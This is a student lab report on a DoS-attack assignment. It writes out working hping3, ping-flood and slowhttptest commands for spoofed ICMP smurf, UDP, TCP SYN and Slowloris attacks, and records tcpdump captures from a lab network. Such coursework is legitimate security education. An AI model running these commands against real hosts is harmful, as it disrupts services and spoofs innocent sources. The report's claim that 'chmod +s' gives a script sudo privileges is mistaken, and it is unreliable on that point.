# PCS Assignment 2: Launching of DDoS attacks using network protocols ICMP, UDP, TCP, and HTTP.

Bhargavi Poyekar: CH33454

1. Commands Invoked:

    A. ICMP Flood Attack:

        Attacker VM =>  time sudo ping -f -c 100000 133.228.86.3

            # ping is used to check if the machine is active or available. 
            # time command is used to calculate the time for the command to run .
            # -f is flood ping, makes the packet sending faster with very less interval.
            # -c is count of the number of packets to be sent.
        ----------------------------------------------------------------------------------------
        
        Target VM => sudo tcpdump -n -i ens192 -s0 -w icmpflood.pcap host 133.228.86.1 and icmp
        
            # -n is used to tell that addresses are not to be converted to names.
            # -i is for mentioning the interface 
            # -w tells to capture the packet in the given pcap file
            # host tells to capture the packets coming from that machine
            # icmp tells to capture only the icmp packets

        Target VM => tcpdump -n -r icmpflood.pcap | grep "echo request"|wc -l

            # -r is used to read the captured pcap file.
            # grep is used to match patterns.
            # wc gets the line count 
    

    B. ICMP smurf attack:

        Attacker VM:

        => nmap -sn -T4 133.228.64.0/18

            # nmap is used to scan the network and determine the available hosts in the network
            # -sn is ping scan, which tells not to discover any ports of the host, just check for available hosts.
            # T4 determines the speed for the scanning, 4 is an aggressive level. 

        => nano smurfattack.sh

            sudo hping3 -1 -q -c 10 -a 133.228.86.3 133.228.72.1 (10 times with different machines)
        
            # nano is the editor that I used. 
            # In the shell script smurfattack.sh, the above command is repeated 10 times, with different addresses.
            # hping3 allows to send custom packets.
            # -1 stands for icmp protocol.
            # -q keeps the ouput quiet and very less is displayed in the output.
            # -c tells the count of packets to be sent. 
            # -a stands for spoofed source address.

        => ls -all smurfattack.sh 

            # ls -all shows all the access permissions of the file 

        => sudo chmod +x smurfattack.sh 

            # chmod +x makes the file executable

        => sudo chmod +s smurfattack.sh 

            # Allows to run all the commands in shell script with sudo privileges.

        => ./smurfattack.sh 

            # Runs the executable file.
        
        -----------------------------------------
        Target VM:

        => sudo tcpdump -n -i ens192 -s0 -w icmpsmurf.pcap src net 133.228.64.0/18 and icmp

            # src net tells to look for packets coming from network mentioned.
            # icmp looks for icmp packets.

        => sudo tcpdump -r icmpsmurf.pcap| grep "echo reply" | wc -l

            # Counts the number of echo reply packets in the captured packets.

    C. UDP Flooding attack:

        Attacker Vm:

        => cp smurfattack.sh udpflood.sh 

            # Copies the content of smurfattack.sh to udpflood.sh

        => nano udpflood.sh

            sudo hping3 -a 133.228.72.1 -c 10 -2 -p 1234 -q 133.228.86.3 (10 times with different machines)

            # Make the changes as required for sending udp packets. 
            # -2 stands for udp protocol.
            # -p stands for port number.
            # The above command sends the packets from the 10 hosts as spoofed source to 133.228.86.3 (target machine).

        => ls -all udpflood.sh 

            # checks access permissions, since it is copied, it was already executable. 

        => sudo chmod +s udpflood.sh
        => ./udpflood.sh

        -------------------------------------------------

        Target VM:

        => sudo tcpdump -n -i ens192 -w udpflood.pcap '(dst 133.228.86.3 and port 1234)' 
        or '(src 133.228.86.3 and icmp[1]=3)' -vvv

            # dst 133.228.86.3 and port 1234 says look for packets whose destination is 133.228.86.3 and port is 1234.
            # src 133.228.86.3 and icmp[1]=3 says look for packets whose source is 133.228.86.3 and icmp[1]=3 says that the destination is unreachable.
            # The above tcpdump has or in between the dst and src, so it is looking for incoming udp packets 
            and outgoing icmp packets.

        => sudo tcpdump -r udpflood.pcap | grep 'UDP'| wc -l

            # grep UDP checks for UDP incoming packets

        => sudo tcpdump -r udpflood.pcap | grep '1234 unreachable'| wc -l

            # grep '1234 unreachable' checks for the outgoing icmp packets.

    D. TCP Syn Flooding attack:

        Attacker VM:

        => cp udpflood.sh tcpsyn.sh
        => nano tcpsyn.sh

            sudo hping3 -q -S -c 10 133.228.86.3 -p 1234 -a 133.228.72.1 (10 times with different machines)

            # -S sets the SYN flag of the TCP protocol.
            # The above command sends the packets from the 10 hosts as spoofed source to 133.228.86.3 
            (target machine) on port number 1234.

        => ls -all tcpsyn.sh 
        => sudo chmod +s tcpsyn.sh
        => ./tcpsyn.sh
        --------------------------------------------------------------------------------------
        Target Vm:

        => sudo tcpdump -n -i ens192 -s0 -w tcpsyn.pcap src net 133.228.64.0/18 port 1234 and tcp -vvv

            # Captures tcp packets coming from the given source network on port 1234.

        => sudo tcpdump -r tcpsyn.pcap | grep "S"| wc -l

            # Looks for tcp SYN flag -> S stands for the Flags [S] 

        => sudo tcpdump -r tcpsyn.pcap | grep "R"| wc -l

            # Looks for tcp Reset flag -> R stands for the Flags [R.] 

    E. HTTPS Slowloris attack:

        Attacker VM:

        => slowhttptest -c 1000 -H -i 10 -r 25 -t GET -u 
        http://133.228.86.3 

            # -c tells the number of connections to be established.
            # -H stands for slowloris mode.
            # -i tells the interval
            # -r is connection rate => how many connections per second.
            # -t HTTP method.
            # -u tells url or ip of the server.

        -----------------------------------------------------------------------
        Target Vm:

        => apache2 -v

            # Tells the version of apache 2. to check if it is installed.

        => sudo systemctl is-enabled apache2.service
        => sudo systemctl start apache2.service
        => sudo systemctl status apache2.service

            # Starts the apache service.

2. Script output and TCPDump Capture Analysis:

    A. ICMP Flood Attack:

        Attacker VM: 

        => 100000 packets were sent to the target machine, they were successfully transmitted and same number 
        of reply packets were received. 
        => It took 15649 seconds for the complete trasmission.
        => No packets got lost.

        Target VM:

        => All the 100000 packets sent by the attacker machine, were successfully captured.

    B. ICMP Smurf Attack:

        Attacker VM:

        => In nmap scanning, all the available hosts were displayed.
        => After running the shell script, all the hping suffered 100% loss, because I used spoofed 
        source address as the target machine, so all the replies went to target machine.
        => The hping waits till the timeout and then stops for looking for replies.

        Target VM:

        => I used 10 packets in each command, hence my N is 10. So I received 100 'echo reply' packets.
        => The target machine was used as the spoofed source, so all the machines replied back to the target machine.

    C. UPD Flood attack:

        Attacker VM:

        => In this attack, I used the 10 machines as spoofed source to send udp packets to target machine.
        => 10 packets were sent by each machine, hence there were total 100 udp packets sent.
        => Even this time, the attacker vm suffers 100% loss, because all the replies went to the spoofed machines.

        Target VM:

        => On the target machine, the tcp dump is set to capture both the udp packets received 
        and icmp packets sent, hence it captures in total 200 packets, 100 udp and 100 icmp.

        Screenshot: https://i.postimg.cc/HsmRVzbQ/image.png
        
    D. TCP SYN Flooding:

        Attacker VM:

        => In this, the packets are sent with tcp protocol and the SYN flag is set. 
        => 10 machines are used as spoofed source, hence all the replies go back to them.
        => Hence, all the hping suffer from 100% loss.

        Target VM:

        => Total 200 packets are captures, 100 are the received tcp syn packets and 100 are the 
        tcp reset generated by the target machines.
    
    E. HTTPS Slowloris Attack:

        Attacker VM:

        => Sends unfinished HTTP request with 1000 connections and 25 connections per second. 
        => It starts with sending the request and occupies the ports.
        => Hence, the service becomes unavailable after some time, after almost 300 connections.
        => Because of lot of request connections, the service stays unavailable, till they timeout 
        and then starts closing the conncetions.
        => At the end, when it closes the connections, the service again becomes unavailable.

        Target VM:

        => Just the apache service is started.

3. Challenges Faced:

    => I faced some issue in finding out how to execute the shell script with sudo privilege. 
    I searched on internet and then found how to use chmod +s to run the command. 

    => When I performed icmp smurfattack, as I was testing out hping3, I sent too many hping packets and 
    they were running for a lot of time (which were getting captured in tcpdump). I then asked Professor 
    how to solve this and he helped me to kill the background running hping processes.

    => In the udp flood attack, I faced some difficulty in understanding how to capture the icmp packets.
    I tried different ways, and then Professor helped me in understanding that we have to look for icmp 
    packet with src ip of target machine, and the icmp[1]=3 --> which is the icmp destination unreachable error.

    => In the tcp syn attack, I didn't set up the syn flag, which made it confusing for me to identify the tcp 
    syn packet in the tcpdump captured packets, but then I read the hping3 man page carefully, to understand
    how to set the SYN flag.

4. Summary of learning:

    => This was a great assignment and I learned a lot from performing these exercises.
    => I understood how all these attacks work. 
    => I got introduced to nmap and hping3. 
    => I learned different parameters in hping and tcpdump.
    => I got more familiar with tcpdump. 
    => I also understood how to find the background process and how we can kill them.

5. References:

    1. https://linuxhint.com/tcpdump-beginner-guide-2/
    2. https://linux.die.net/man/8/hping3
    3. https://www.cyberciti.biz/faq/how-to-install-apache-on-ubuntu-20-04-lts/
    4. https://linux.die.net/man/8/ping
    5. https://www.tcpdump.org/manpages/tcpdump.1.html
    6. https://nmap.org/book/man-briefoptions.html
    7. https://www.linuxquestions.org/questions/linux-newbie-8/chmod-s-436290/
    8. https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml
    9. https://ourcodeworld.com/articles/read/949/how-to-perform-a-dos-attack-slow-http-with-slowhttptest-test-your-server-slowloris-protection-in-kali-linux
    10. https://manpages.ubuntu.com/manpages/trusty/man1/slowhttptest.1.html#description
    11. https://www.cloudflare.com/learning/ddos/ddos-attack-tools/slowloris/
    



    

